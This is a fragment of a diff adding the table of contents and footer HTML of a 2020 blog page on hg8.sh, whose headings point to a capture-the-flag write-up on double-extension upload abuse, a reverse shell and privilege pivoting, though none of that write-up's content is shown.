+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Double-Extension"><span class="toc-number">1.2.</span> <span class="toc-text">Abusing Double Extension</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-and-launch-of-Reverse-Shell"><span class="toc-number">1.3.</span> <span class="toc-text">Upload and launch of Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-theseus"><span class="toc-number">1.4.</span> <span class="toc-text">Pivot www-data -&gt; theseus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
